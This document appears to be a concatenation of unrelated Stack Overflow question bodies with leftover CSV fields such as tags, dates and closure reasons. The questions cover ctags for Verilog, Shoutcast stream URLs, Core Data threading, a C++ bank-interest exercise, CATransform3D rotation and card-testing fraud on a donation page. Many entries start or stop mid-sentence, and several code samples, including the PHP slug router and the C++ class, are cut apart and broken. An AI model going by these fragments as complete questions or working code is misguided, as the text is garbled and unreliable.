I currently generate the tags using the command

    ctags -e -R --tag-relative=yes --langmap=verilog:.v.vh.sv.svh 

My code contains a lot of `define macros which are all specified in certain header files with extension "".vh"" & "".svh"". For e.g. a header file named **foo.vh** has the following code

    `define WIDTH_ADDRESS 32;

and a file **top.v** invokes the macro as follows

    input [`WIDTH_ADDRESS - 1 : 0] InAddress;

While browsing the **top.v** file using emacs, is there any way by which I can jump directly to to the macro definition in the **foo.vh** file?

I have been using `M-x tags-search <RET> WIDTH_ADDRESS <RET>` for sometime now but it jumps to quite a few other instances of `WIDTH_ADDRESS in other files before reaching the foo.vh file.

After some research I did see an option to specify header files using `-h` option with ctags during tags generation. However I could not get it to work and I guess there was some syntactical error from my part.

First of all are there any notable benefits of specifying a header file using `-h` option? If so, what is the correct syntax to specify header files? Also can I specify emacs to look into these header files first (files with extension "".vh"" &"".svh"")  before parsing other files (with extension "".v"" & "".sv"")",emacs,verilog,ctags,system-verilog,exuberant-ctags,,open

Typically what I've done up until now when in this situation is create a staging area for the data that needs to be imported (essentially a temporary table just for storing the data until I'm done merging). I copy _all_ of the data that _might_ be needed from the source to that staging area. Then I merge the data as I would if the two tables were connected, meaning of course that I can filter out whatever data I don't need at that time.

Here's the problem in my current case. The source table is _extremely_ large and entirely _un-indexed_ (something over which I have no control, ugh). That means it takes **forever** to get the necessary data if I don't filter it in some way. In addition the destination table really only needs a relatively small subset of the data to do what it needs to do, maybe ten thousand or so distinct rows at a time.

MS Word document but still allowing them to be readable by ""standard"" image processing stuff (browsers, paint.net, etc.) as a normal .png.

What gives? Clearly there is way more to the .png format than just losslessly compressed bitmaps.",image,compression,png,format,fireworks,11/12/2011 19:04:15,off topic

We solved a problem.  I’m sure old media server hounds know about this.  I didn’t.  I hope this saves you time in the future.

Problem: My customer’s Shoutcast listing went away but their provider didn’t. (Shoutcast has listings for many stations as a convenience.  My customer’s used to be: 
http: //yp.shoutcast.com/sbin/tunein-station.pls?id=3012xxx and then it went away!  Their station didn’t.

We were left with several URLs provided us by the station and none of them played via our player.  Within each .pls, .ram file, the same URL was listed (see note) - something like this:

http: //74.53.186.162:9082/

How did we solve the problem?

On the Shoutcast console page above, there is a listen link.  It refers to a URL with a .pls extension.  It also shows the sample rate, number of current listeners, etc.  The URL worked. 

What made this interesting is that file located at that URL actually was a .pls text file with the original URL (something like http: //74.53.186.162:9082/) !

What did I learn?

1. Shoutcast servers know what kind of client is accessing their data.  I would assume the same to be true of IceCast servers.  How did I know?  The circular URL reference.  This means that your player parses text files first much like your browser looks at the mime type.
2. Media player classes that you use in code can be really dumb.  They’re sensitive to mime types, bit rates, extension names, etc.
3. If I have the .pls or other media file, I can use them locally.
4. Hard coded IP addresses are just as bad as they ever were.  Unfortunately, developers don’t have much control over this.

Note: Audio Streams with .pls, .ram, etc are text files that have URLs in them to the actual stream.  The text file has other meta data as well.  If you take the raw URL from the txt file and launch it, you might get a Shoutcast Server interface that gives you stream information that your player might use.  (When viewing a radio station’s website, you can sometimes find the stream URL in the player’s launch parms.  Sometimes they can be different.)",java,android,,,,06/27/2011 17:13:22,not a real question

But, I am looking for a suitable software as a starting point from which to continue programming my desired customizations, so I hope it's close enough.

Here are the requirements, for which I am looking for in a web-based tournament management software:

- Customizable: open-source would be perfect, otherwise at least needs to support plug-ins to support different kinds of sports/games/results/etc.
- Authentication: support for authenticated users that can be related to different tournaments as well as teams
- Runs mostly non-supervised: as the tournaments are web-based I'd like to give contestants the possibility to sign-up themselves (based on authentication system to reduce the spamming problem) and report results themselves. Result reports vary dramatically based on the actual tournament, hence, may require some result determination plug-ins. The goal is to reduce the required manual effort by administrators.
- Web interface: I am not interested in off-line tournament management software
- Active: If in any way possible I'd like to build upon software that is maintained and/or in active development

Some optional nice-to-have features would be:

- automatic bracket generation with selectable algorithms (round-robin, KO system, etc)
- visualizations (mainly brackets)
- statistics




I am asking this question after a few hours of researching alternatives I could find. I will list the tools here that I found and what is wrong with them for my purposes. Please feel free to help me improve my google-fu, or point out if I have overlooked something in my evaluations.

- open tournament system: looks roughly like what I had in mind, but never seems to have taken off and is unmaintained for almost half a decade now
- KMleague: also sounds nice, but doesn't appear to be maintained anymore (I couldn't get access to their forums for more information either. Never received the activation e-mail.) Maybe someone here knows it and whether it's worthwhile to check out the code as a starting point.
- In this [SO thread][1] I found Tourney logic and TournamentAPI, which both require off-line management of the tournaments. Additionally, the first is commercial and the latter hasn't released anything yet.

Several commercial products I quickly dismissed for their lack of customizability (most are strictly limited to a certain sport/game) and because all I came across where again off-line managed.

These ellipses can be repositioned within the frame when the user drags them. Clicking on an ellipse causes the text to become editable: a carat appears, highlighting a substring is possible, etc.

I've got the basic structure set up: the 'ellipse' is a self-contained component, with methods called on it from the containing JFrame and its listeners. I've tried two approaches:

1. in the component's draw() method, use a TextLayout to find bounds, position the contained text within the ellipse, and draw it to the frame using TextLayout's draw(). This is fast. Dragging the components around in the JFrame, mouse-over and mouse-click behavior are all straightforward. However for the editing functionality it looks like I will need to write a lot of custom code to handle hit testing, carat positioning, text highlighting, line wrapping, etc.

2. having the component contain a reference to the containing JFrame, and adding or repositioning a TextComponent in that JFrame after drawing the ellipse. This has the advantage of all the built-in TextComponent behavior for editing and line wrapping. But the logistics are really sloppy, and positioning the TextComponent becomes messy too - especially when the user drags the component around.

I'm quite possibly thinking about this all wrong. Can anyone suggest a simple way to do this that I haven't yet stumbled across?

Now I want to try to programm something bigger:

There should be 4 websites build with MVC3. All the websites should use only one SQL-Membership-Database and some tables like contacts and so on should be shared between the diferent pages too.

**Now my question is: how to start?** 

**1.** Should I use one database for all the tables (each application needs up to 40 different tables) including the shared tables like the SQL-Membership-Database or should I create one database for Shared Data, one for Application 1, one for Application 2 and so on?

**2.** Should I put all the Applications into one MVC3-application and just seperate them by using areas?

**3.** All the applications need to save text and pictures, should I use one Table for pictures from Application 1/2/3... and choose them by an application ID or should I create a image-table for each application (same question for texts and descriptions and tooltipps...)?

**4.** My idea was to work woth blob (MS sql 2008 R2) to save files, do you think a good choice? 

Is there anyone who have got tipps ore experiances in creating huge (for me its huge ;-)) applications like this?

Unfortunately, the options given to do this don't seem to work.  I'm posting the spec file as I see it should be.  The version given doesn't actually fail, but it installs the PEAR packages in the wrong location.  While they should go in /var/tmp/my_php-5.3.3-1-buildroot/usr/local/lib/php, but they end up in /var/tmp/my_php-5.3.3-1-buildroot/var/tmp/my_php-5.3.3-1-buildroot/usr/local/lib/php.

You can also see where I had to hack the pearcmd.php script because it was completely ignoring the include_path setting the pear command passed it (derived from the PHP_PEAR_INSTALL_DIR environment variable).  This could be completely wrong, but it's the only way I could get it to actually install anything at all.

I have tried many other variations of this spec, but they all seem to ""fail"" in their own way.  FYI, I've also tried using Pyrus, but it had similar issues (in addition to issues with non-PEAR2 packages).

I need to detect blinks real-time, and I have made it by an online template matching following some papers/guidelines. It works great but the template match also goes down when the eyes look in another direction.

So I would like to know if the movement tracked is mostly vertical (or downwards) to confirm that 2 eyes have blinked and not just looked in another direction.

PS: I'll keep the template match part of my project :-)

Today I went to an interview for a C# role. The 1st question was 'Tell me about boxing'. Given my experience I had no idea what the guy meant. Needless to say the interview didn't go that well. Others questions were 'why isn't it recommended to  use an ArrayList of int', 'tell me what you know about threading', etc.  
  
I don't really want this to happen again so I'm planning to spend some time reading (and practising) more on C#. I understand that the best way of learning is by coding but coding wouldn't have really helped me answer the question about 'boxing' for example.
  
I'm not asking you to answer the above technical questions. In fact, I know now their answer as I went straight to Google after the interview and it's how I realised that my C# knowledge is somewhat limited.
  
My question is: in your opinion, which knowledge should any C# developer have? Ideally it would be better if you could categorize it (Basic knwoledge anyone should have without exception, Advanced knowlege, Expert knowledge etc). No need to go into details. Doing research on whatever you list will be a good exercise for me.

We're running a server in IIS 6 that hosts several web sites and applications, and we're in the process of moving the whole thing to a different data center with a slightly different setup.  We've notified our users and updated our DNS info so that theoretically everyone will be happily hitting the new server from day 1, but we know that someone will inevitably fall through the cracks.

The powers that be want a ""Listener"" page/handler that will receive *all* requests to the server and log the entire request to a text file, including (especially) POST data.

That's where I'm stuck.  I don't know how to implement a single handler that will receive all requests to the server.  I vaguely understand IIS 6 redirection options, but they all seem to lose the POST data on the redirect.  I also know a little about IIS 6's built-in logging, but it ignores POST data as well.

Is there a simple(ish) way to route all requests to the server so that they all hit a single handler, while maintaining post data?

These days, those abstractions include things like functions, classes, interfaces, recursion, and higher-order functions. But what else is there? How can we further abstract our designs, so that I needn't think about *anything* but my immediate, direct goal? What novel abstractions have yet to be leveraged by existing technologies?

Also note that most of the items on my list (with the exception, perhaps, of recursion) are also tools used for code reuse. Code reuse is *not* the subject of this question, and is not what I see as a necessary aspect of a good abstraction. Functions are useful as abstractions because they hide what they are doing behind a descriptive name, not because I can call them from several different places.

A poorly-formed idea: Is a driver function that only calls a sequence of other functions, without maintaining any state of its own, really the same as a function? We write it as a function, and call it as a function, but perhaps it represents a different concept? This is reflected in some languages by making a distinctions between procedures returning values and procedures not returning values. But maybe there's a better way to view that difference, some different way to abstract the sequence of relatively unrelated steps?

Which means I am heavily using Split, IndexOf and SubString method of string class. I am trying to use StringBuilder class whereever I have to do any concatenation. However when application is doing this parsing, app cpu usage goes high (60-70%). I am guessing that calling these string APIs is what's causing cpu usage to go high, speically the size of data is big (typical Length of string is 400K). Any ideas how can I verify what is causing cpu usage to go that high and also if there are any suggestion on how to bring cpu usage down?",c#,string,,,,,open

i need to...
1) take data from a field
2) convert it to a float
3) do some math
4) then plop the results in a label

i've gotten a version of this working where i pull the text from a filed and plop the results into a label upon clicking on a ""Calculate"" button, that was easy. so i know that points 1 and 4 are good. now for the tough part...

i've setup an initial version to ensure i can do points 3 and 4 by setting my float variables as static bits of data...

    float float_DiameterA, float_DiameterB;
    float myR1, myR2;
    
    float_DiameterA = 20;
    float_DiameterB = 5;
    	
    myR1=(float_DiameterA-float_DiameterB)/2;
    myR2=1;
    
    r1.text=[[NSNumber numberWithFloat:myR1] stringValue];
    r2.text=[[NSNumber numberWithFloat:myR2] stringValue];
    a1.text = txtLength.text;

results : r1 displays ""7.5"" and r2 displays ""1"". this works perfectly BUT i need to take txtDiameterA.text and put it into float_DiameterA as a floating point.

here's what i've tried for step 2...

    str_DiameterA = [txtDiameterA.text text];
    float_DiameterA = [[str_DiameterA text] floatValue];

but that didn't work ;-/

i've even tried several versions of
	if(EOF == sscanf(str_DiameterA, ""%f"", &float_DiameterA)){
		//error
	};
	
and 
	
	float_DiameterA = sscanf(txtDiameterA.text, ""%f"", &f);

but none of those worked either. i think that's when i started to realize this wasn't C++ as i thought it was lol...

think you'll get the idea by now.

so...

**how do you take the input from txtDiameterA.text and convert into a float?** please don't tell me to use Root Beer instead of a Cola lol.

oh, here's a few more bits of information that might have some impact...

I keep reading mixed feelings about Sharepoint development but from what I have read it looks interesting, especially the visual web parts and connecting LOB services.

As far as experience, I have built 3 ASP.Net Webforms applications from the ground up and learned C#, SQL, XHTML, XML, CSS, Photoshop/Expression Design and some jQuery along the way. I am perfectly comfortable in the Webforms environment but I haven't touched MVC at all. My primary coding background is C++ but C# has really grown on me.

Now that I practically shared my life's story, would it be beneficial to try and learn Sharepoint full throttle? I want to make a lot of money and will be working in the DC Metro area.

I just want to know if there is a future in Sharepoint development this late in the game. What are the chances that Microsoft abandons it and companies overhaul to something else instead of keeping Sharepoint in legacy mode?

I'm ready to start my career so any comments are appreciated. Thanks.",sharepoint,,,,,06/19/2012 07:09:25,not constructive

Since the data are not co-dependant, it made sense to multi-thread the application to execute multiple fetches and parses simultaneously.  I use NSInvocationOperation on a search and parse object I have written to execute this function.

In the controller object I have the following method:  

    -(void) searchAndParseAsynchronously { 
     NSPort *serverPort = [NSMachPort port];
     NSConnection *serverConnection = [NSConnection connectionWithReceivePort:serverPort sendPort:serverPort];
     [serverConnection setRootObject:self];
     for (NSURL *urlToProcess in self.urlsToFetch)
     {
      BaseSearchParser *searcherForURL = [BaseSearchParser newSearchParserWithParameters:self.searchParams];
      searcherForURL.urlToDocument = urlToDocument;
  
      SearchThreader *searchThreader = [SearchThreader new];
      searchThreader.threadConnection = comConnection;
      searchThreader.targetSchema = searcherForURL; 
      NSInvocationOperation *threaderOperation = [[NSInvocationOperation alloc] initWithTarget:searchThreader 
                                                                                            selector:@selector(executeSearchParse) 
                                                                                              object:nil];
      [self.operationQueue addOperation:threaderOperation];
     }
    }

The application relies on Core Data, which I've gathered is mostly thread unsafe.  I have a different NSManagedObjectContext for each search/parse operation (and one for the controller), and only pass the NSManagedObjectId between operations or proxy objects.

The operations communicate the completed parse results back to their controller via an NSConnection object.  The controller constructs the NSConnection using an NSMachPort object, sets itself as the root object, and gives the same NSConnection object to each of the targets of the NSInvocationOperations.  The controller then enqueues the NSInvocationOperation for execution in its own NSOperationQueue.

In the search threader object I have the following method:

    -(void) executeSearchAndParse
    { 
     id parentServer = [threadConnection rootProxy];
     [parentServer setProtocolForProxy:@protocol(SearchParseProtocol)];
 
     NSArray *importResults = [targetSchema generatedDataSetIds];
 
     [parentServer schemaFinished:targetSchema];
     [parentServer addSearchResults:importResults];
    }

I believe I have followed the Apple example of generic inter-thread communication given [here](http://developer.apple.com/mac/library/documentation/Cocoa/Conceptual/DistrObjects/DistrObjects.html).

I have to say that most of the time, this works beautifully: The notifications from the NSConnection rootProxy are posted to the run loop in the main thread as expected and wait for pickup until the controller object is ready.  However, in some of my test cases it causes Core Data to grind to a screeching halt because sometimes the messages make it to the controller object *in the same thread as the NSInvocationOperation object which is calling the rootProxy object*.  

I've placed a debugger point in the controller on the message which is sent when the search/parse operation is complete, and sure enough, sometimes (just sometimes) the executing thread is *not* the main one.  Does anyone have an idea as to why this might occur?  Or, is there a simpler way to construct inter-thread asynchronous communication?  OR is my approach for Core Data totally off-kilter?

The way it works is that a slacker get hold of a whole bunch of credit details but doesn't know which numbers are good or not. So they go to a donations page and attempt a small donation ($5 or less) with the stolen card number. If the donations goes through then they can use the number for bigger purchases.

Carding can cost a non-profit a lot of money as most these ""donations"" will end being reversed and in some cases a charge back fee will be charged by the bank.

Has anyone else had experience with this? Also, what are some ways that I could stop it?

Each node is assigned multiple Tx and Rx port numbers depending on how many nodes it is connected to and every Tx port on a node maps to just one Rx port on some other node. So for e.g., if I have 2 connected nodes A and B, then my port maps would look like: at A , tx_port=4000 rx_port=4100 destination_rx_port=4101; at B, tx_port=4002 rx_port=4101 dest_rx_port=4100. This list would get longer at each node as it connects with more nodes. 

Now on every node, I create as many threads as there are receiving ports to listen to all of them simultaneously. I then send a HELLO from each node to all of its connections and keep sending it until an acknowledgment is heard from each of them. Now coming back to the case of A and B, if I run A first and then B, B's HELLO is heard by A and is also acknowledged, and B stops its HELLO transmission. But A's HELLO is never heard by B and B always crashes (aborts). The situation is the reverse when I run B first and then A.

But I found out that if I din't create the threads and just placed my port_listen() function inside main under a while(1) loop then B is able to listen A's HELLO. The problem appears to be that I have to create the thread to listen on a port before I send anything to that port, but that sounds silly and I'm sure there is a better explanation. I would be grateful if anyone helped me. I haven't posted my code because it is rather big and messy for now, and has a lot of other things going on but as I've checked, the code gives the same problem even after commenting them out.

So for (a little) example when you come to the shop and want to print a business card, you get to decide if you want to print black and white or in color, if you want to choose thick paper or thin, if you want to print 100, 200, 500 or 1000 pieces and so on.

After all there will be a price for let's say: black and white, thick paper, 200 piece => 40,-$

In real you have many more choices to choose from. So as you can think there are many many prices, for which there is **no formula**.

So my question is: How can I handle the prices?

My first idea: Decorator Pattern.

But when I thought about it, it's not a very good idea. As I told there is no real formula, also I have to generate the wizard (which may be different if you want to print greeting cards). Also I want to be able to change the price trough a admin interface or add a product or add a new ""decision"" like ""do you want glossy paper?"" to a product or remove one (and still keep the prices intact).

So now I'm thinking about using a tree for each product in which I can add a level (a new decision), resort levels and so on.

Another Idea is to Build some Kind of Key-Objects through the decisions and look the price up in a Price table. A bit like a Dictionary in which I add the decisions and after all I generate a key out of it to look up the price in a price table. 

So before prototyping I was wondering if I'm just blind and I don't see the obvious solution or maybe there is another way which is more elegant I don't know about?",wizard,e-commerce,shop,design-patterns,architecture,,open

However, I'm constantly reading about Ruby on Rails and how it's gaining popularity. I decided to research into why this was the case. Is Ruby on Rails really better than PHP? Or, is it just another avenue to get the job done (e.g. ASP.net)?

Doing basic research on Ruby and it's comparison to PHP, the internet is littered with blogs and editorials of people who are biased one way or the other. PHP is great, awesome, and amazing. Ruby on Rails is the PHP killer. This type of information isn't useful to me.

I write in PHP daily. I've used PHP for many different purposes:

 - Basic web sites
 - Ground-up Content Management Systems
 - Load-balanced web applications
 - Web service and XML communication
 - Server-level mainframe access
 - IMAP and email access

This is obviously a well distinguised list of tasks in varying complexities. I'm assuming Ruby can do all these things, but is PHP\Ruby really easier or more powerful?

So, I confide in the community: Who here uses both of these programming languages daily? Or even, who has used both and can confidently say they are well educated in both equally? I would love to hear your opinions on which is ""better,"" if that's even the case. Perhaps they are both equally as powerful depending on their use. I'm just looking for an unbiased opinion comparing and contrasting the two from an actual developer with experience in both.

 1. Learn and master .NET since presumably that's widely used in that industry
OR
 2. Learn the programming concepts, learn algorithms, learn a little bit of c,c++,c#,java,objective-c,sql,oracle,cobol - in other words learn the fundamental principles that tie all programming languages together without going too deep in any particular language.

Someone has told me that most of the time as a programmer you won't be writing any code, but instead maintaing and existing code that people before you have built. Does that mean I don't really need to master any specific language and as long as I have general concepts it'll be good enough? 

If you or if you know someone who has worked in the financial industry as a software developer could you please share the experience and what is the daily routine consists of? Also what should I be learning right now while I am still young and in college? Do I have to thoroughly understand the market and the current economy?

I would like my query to return only the rows where the pattern matches the first number. So if the user searches for '321' it will only show records that look like 321 but not those that have 321-1 or 321-3. Similarly if the user searched for 321-1 you would not see 321. (that's the easy part)

Right now I have

     LIKE '321%'

This finds all of them regardless of if they are followed by dots or not. Is there a way I can limit the query to only specifics despite that field having more information that it should. 

(P.S. I did not set up this system, it makes me wince to see two data points in one field
I'm sorry if my title isn't right, suggest a new title if you can. )

To explicate, normally when you browse to `""http://admin.foo.com""`, it sends an HTTP request that looks something like this:

    GET / HTTP/1.0

...and that request is sent to admin.foo.com's IP, which (let's say) is 10.0.0.1.  The ""Host"" header is extracted from the URL, and that header is what Apache uses to determine which virtual host to use.  If I put the IP address of admin.foo.com into Firefox, it sends the request to the right server, but the Host field has the IP address in it, and then Apache doesn't know what vhost to use, and defaults to using no vhost at all, which (in its config) causes a 403/Forbidden, so I can't navigate to the new server's IP to test this.

Let's say I want to retrieve ppt and pdf lecture notes pertaining to bioinformatics field. I would like to know if this task can be achieved by adapting the approach of using neural bots trained by a neural network? Just wanted to confirm that this approach is not completely wrong before I proceeded further with my implementation.  

And in case someone is wondering why a neural network or any learning algorithm at all is required in this case well here is my plan (which might be wrong or there might be an easier way to achieve this so please feel free to correct me):

I generate neural bots trained by a neural network (not sure how this training happens yet, I am assuming by supervised learning using a sample training set of certain ppt and pdf files) and then these bots retrieve pages that are similar to what they learnt through their training.

`www.example.com/home` becomes `www.example.com/inicio`

`www.example.com/profile` becomes `www.example.com/perfil`

`www.example.com/help` becomes `www.example.com/ayuda`

And so on. My question is: what's the best way to support this in a PHP application? For incoming requests, I thought a dictionary like the following in my `router.php` file would suffice:

    <?php
    $request = explode(""/"", trim($_SERVER['REQUEST_URI'], ""/""));
    
    // Dictionaries of page slugs.
    $slugs = array(
        'es' => array(
            'inicio' => 'home',
            'perfil' => 'profile',
            'ayuda' => 'help',

            $request[0] = $slugs[$lang][$request[0]];

Which basically takes URL segments and matches them against an English counter-part if it exists. If not, then it will proceed as normal and most likely cause a 404 as a controller doesn't exist for URL segment.

Although this words, I need it to be backwards-compatible too. For example, when building URLs in my application.

Naturally, as the application is only English at the moment these are just hard-coded. So say, when fetching a `User` object I do the following:

    <?php
    class User {

While this would certainly be a massive departure from c-style languages, it seems to me that since C# is ultimately being compiled down to IL (which would still have the curly braces and semicolons), it really is just a parsing trick the compiler can handle either way (i.e. it can either deal with significant whitespaces or not). Since curlies and semicolons are often a barrier to entry to C# & they are really only parsing helpers (they don't in themselves impart meaning to your code) they could be removed ala Haskell/Python.

What I want to do is to enforce the presence of 'category_ids' on an 'activated' account.

I am doing [Email Only Sign-up][1] - which is important to note, because it is a two-stage process. The first time a user enters their email address, they are sent an activation email - with a link to `Confirmations` controller.

The view for that `Confirmations Controller` has the additional details that need to be validated.

If I just did a regular `validates_presence_of` on the `User` model, then when a user initially submits just an email address - Rails would fail it (which I don't want).

The user should:

 1. Enter email address
 2. Click confirmation/activation link in email
 3. Fill in name, password and select a category.
 4. Submit.

Step #3, Devise enforces presence_of_validation for name & pw. But not my custom item called `category`.

How do I do that?

I have a quite complicated web form where most of the fields are disabled by default and they are enabled by the use of checkboxes. When all the optional blocks are disabled and only the main one is enabled, the form works perfectly, but when I enable at least one of the blocks, things become awful. 

After many debug attempts, I observed that when one of the auxiliar block is enabled, when I submit the form it doesn't reach the action and just tries to refresh itself, which causes a lot of problems as many of the lists I use to populate the comboboxes are load on run by jQuery, so it produces Exceptions like 

`tag 'select', field 'list', name 'f_sel_pais': The requested list key 'paises' could not be resolved as a collection/array/map/enumeration/iterator type. Example: people or people.{name} - [unknown location]` 
because most of the lists are null when it tries to reload itself. I also have the load of the default lists on a separate input() method rather than in a prepare() method as the latter would load itself in every call of the action and this is something that generally drains resources innecessarilly.

I have no idea why this happens. My best guess is that, as the form is rather complicated, surpasses the size limit of a form in struts 2, which causes this rare behaviour, but I haven't found a thing about something like that so it may be something else.

My ""enterAccountData()"" function is suppose to ask the user for an account number and a balance neither of which can be negative and the account number cannot be less than 1000

The second one is the one I am stuck on ""computeInterest()"" THis function is suppose to accept an integer argument that represents the number of years the account will earn interest. The function then displays the account number from the previous function and displays its ending balance at the end of each year based on the interest rate attached to the BankAccount class. (The interest rate on ""BankAccount"" has to be a constant static field which is set at 3 percent(0.03)). 

So My question is this: How do I set up ""computeInterest()"" too allow it to calculate the interest using the constant static field when my debugger will not allow me to actually keep the field as a constant? I am not trying to stop any random errors from happening for now, just trying to get the jist of what the book is exactly asking for. Here is my code.

    #include <iostream>

    {
    private:
	int accountNum;

	void computeInterest();
	void displayAccount();
    };

			""Enter a new account number: "" << endl;
		cin >> number;
	}

	cout << ""Enter the account balance "" << endl;
	cin >> balance;

	while(balance < 0)
	{
		cout << ""Account balances cannot be negative. "" <<
			""Enter a new account balance: "" << endl;
		cin >> balance;
	}
	return;
    }

    {

	double rate = 0; 
	int counter = 0;

	counter = 0;

	{
	 balance = accountBal * rate + accountBal;
	 counter++;
	}while(months < counter);

The application would serve as a simple data editing tool for a SQL Server 2008 database.  The user would be supplied a record from the DB and would make corrections within the record and ""submit"" the changes to the system.  I'm not worried about having the most advanced graphics/display but would like to make sure at least 1 new release/update is generated each year based on user feedback.  I've seen estimates for development cost between 10/hour to 250/hour.  Has any one had any experience in developing Ipad apps and pricing the cost associated with them?  Also, what types of features in the apps tend to push the cost up or down during development.  Lastly, is it safe to assume maintenance cost for future updates would run the same cost as development cost?

They do things like referencing Tables defined in the active worksheet, setting their datasources to IEnumerables, etc.

However, now I need to reference a Table which is not in the active sheet.  Basically, the active sheet has a button that triggers some C# code-behind, and I need to figure out how to get a reference to a Table on the fourth tab/worksheet in my workbook while inside the code-behind for the first tab/worksheet (the active one).

In my existing code (which works), I can do this on the active sheet:

    this.Table1.DataSource = results;
    this.Table1.RefreshDataRows();

... so the ""Table1"" reference is right there and I can access it easily.

However, trying to get a reference to a Table in the other sheet, I run into ComObject errors.  For example, I was hoping that this (or something like it) would work:

    ((Sheet4)Application.Worksheets[3]).Table2.DataSource = results;
    ((Sheet4)Application.Worksheets[3]).Table2.RefreshDataRows();

... but that throws the error: ""Cannot convert type 'System.__ComObject' to ContractStatementClient.Sheet4'"".  Writing those lines allows Visual Studio to find the Table (Table2) using IntelliSense, but at execution time it fails with the ComObject error I mentioned.  ""Sheet4"" is the name of the class that Visual Studio created for me when I made the new tab.

I can get references to Worksheets that seem to work by doing:

    Application.ActiveWorkbook.Worksheets[3]

... but I can't seem to figure out how to get from there to having a handle to a Table (or ListObject), that I can set the DataSource property on, as I've done in the past.

I tried this, but it throws a ""NOINTERFACE"" COM error during the cast:

    Worksheet worksheet = Application.ActiveWorkbook.Worksheets[3];
    ((Microsoft.Office.Tools.Excel.ListObject) (worksheet.ListObjects[1])).DataSource = results;

Am I missing something obvious?  I know next to nothing about COM, so it's tough for me to diagnose what's going on.  In the end, I just need to figure out how to set the datasource for the Table/ListObject in the other tab/worksheet (and presumably tell it to refresh itself).

In the past, there is only one weblogic server, but now, there are two weblogic servers in a cluster. 

Session replication have been tested to be working in this cluster. The web application consist of a few links that will open up different forms for the user to fill in. Each form has a dynamic dropdownlist that will populate some values depending on which form is clicked. These dropdownlist values are retrieved from the oracle database.

One unique issue is that the first form that is clicked, might took around 2-5 seconds, and the second form clicked could take forever to load or more than 5 mins. I have checked the codes and happened to know that the issue lies when an attempt to call the one instance of the db connection. Could this be a deadlock?

        myStackPanel.Children.Add(myEllipse);
        return myStackPanel;

For some reason, the VisualBrush is not being rendered in the DrawRetangle(...) function. I can see the green border but nothing else. In addition, if I swap out the VisualBrush with a standard brush, it works great:

One of the recent key requirements is to enrich application by adding some advanced search capabilities. 

In the Project performance is one of important factors due to very large tables (10+ milions of records) with parent-children relations (for example: multi-level parent-child relationship, where I am looking for all parents with specific children). The search engine should also be able to check these references for hits.
 
I have found some potential engines on stack overflow, however it looks like that all of them are dedicated rather for text search than relational db and hosted on linux os:

- Lucine
- Solr
- Sphinx

As I understand some of them use documents as a source of searching, but is it possible/ efficient to create programmaticaly documents based on my relational data? As I am not familiar with all of their features/capabilities can anyone please make some recommendations or propose some different solution?

To summarize my requirements:

- framework/engine to search relational database including decendants.
- support for Microsoft SQL Server
- can be used in .NET applications
- preferably hosted on Windows systems

Does any of mentioned above are able to solve my problem? do you know any better solution?

Which is something like this:

    def fwalk(root, pred_dir, pred_files, walk_function=walk):
        """"""Wrapper function around the standard os.walk, that filter out
        the directories visited using a filtering predicate
        """"""

        for base, dirs, files in walk_function(root):
            # ignore also the root directory when not needed, which is
            # actually more important than the subdirectories
            dirs = [d for d in dirs if pred_dir(path.join(base, d))]
            files = [f for f in files if pred_files(path.join(base, f))]

            if _ignore_dirs_predicate(base) and (dirs or files):
                yield base, dirs, files


Basically it behaves as os.walk, but takes two predicates to make it a bit nicer to compose in higher-level functions.
For example this will only go through the python modules:

    ISA_PY = lambda f: f[-3:] == '.py'
    # I can make it a class or maybe even a module if it's better
    def walk_py(src):
        # should not be in the list
        return fwalk(src, _ignore_dirs_predicate, ISA_PY)


It also takes a walk function which for example can be just a dummy walk, used for testing.

    def dummy_walk(_):
        test_dir = [
            ('/root/', ['d1, .git'], []),
            ('/root/d1', [], ['setup.py']),
            ('/root/test', [], ['test1.py']),
            ('/root/.git', [], [])
        ]

        # returns a function which  skips the parameter and return the iterator
        return iter(test_dir)


The problem now is that I find it very hard to trust this function, apart from the some unit testing using the dummy walk is quite hard to make sure it's correct.

Any suggestion about how I can improve this and make it nicer?

I want to rotate it (lay it back) in its X axis and then spin it around its Z axis.

I've read every question here that has CATransform3D in the body, I've read Steve Baker's [""Matrices can be your friends""][1] article as well as Bill Dudney's book ""Core Animation for Mac OS X and the iPhone""  I think Brad Larson's [""3-D Rotation without a trackball""][2] has all the right code, but since he's permitting the user to adjust all three axis, I'm having a hard time shrinking his code into what I perceive to be just one dimension (a rotated z axis).

Here's the image I'm testing with, not that the particulars are important to the problem:

![Gold Record][3]

I bring that onscreen the usual way: (in a subclass of UIView)

    - (void)awakeFromNib
    {
        UIImage *recordImage = [UIImage imageNamed:@""3DgoldRecord""];
        if (recordImage) {
            recordLayer = [CALayer layer];
            [recordLayer setFrame:CGRectMake(0.0, 0.0, 1024, 1024)];
            [recordLayer setContents:(id)[[UIImage imageNamed:@""3DgoldRecord""] CGImage]];
            [self.layer addSublayer:recordLayer];
        }
    }

That's the first test, just getting it on the screen ;-)

Then, to ""lay it back"" I apply a transform to rotate about the layer's X axis, inserting this code after setting the contents of the layer to the image and before adding the sublayer:

        CATransform3D myRotationTransform = 
                        CATransform3DRotate(recordLayer.transform,
                                            (M_PI_2 * 0.85), //experiment with flatness
                                            1.0, // rotate only across the x-axis
                                            0.0, // no y-axis transform
                                            0.0); //  no z-axis transform
        recordLayer.transform = myRotationTransform;        

That worked as expected: The record is laying back nicely.

And for the next step, causing the record to spin, I tied this animation to the touchesEnded event, although once out of the testing/learning phase this rotation won't be under user control:

    CATransform3D currentTransform = recordLayer.transform; // to come back to at the end
    CATransform3D myRotationTransform = 
                    CATransform3DRotate(currentTransform,
                                        1.0, // go all the way around once
                                        (M_PI_2 * 0.85),    // x-axis change
                                        1.00,    // y-axis change ?
                                        0.0);   // z-axis change ?
    recordLayer.transform = myRotationTransform;        
    CABasicAnimation *myAnimation = [CABasicAnimation animationWithKeyPath:@""transform.rotation""];
    myAnimation.duration = 5.0;
    myAnimation.fromValue = [NSNumber numberWithFloat:0.0];
    myAnimation.toValue = [NSNumber numberWithFloat:M_PI * 2.0];
    myAnimation.delegate = self;
    [recordLayer addAnimation:myAnimation forKey:@""transform.rotation""];

So I'm pretty sure what I'm hung up on is the vector in the CATransform3DRotate call (trust me: I've been trying simple changes in that vector to watch the change... what's listed there now is simply the last change I tried).  As I understand it, the values for x, y, and z in the transform are, in essence, the percentage of the value passed in during the animation ranging from fromValue to toValue.

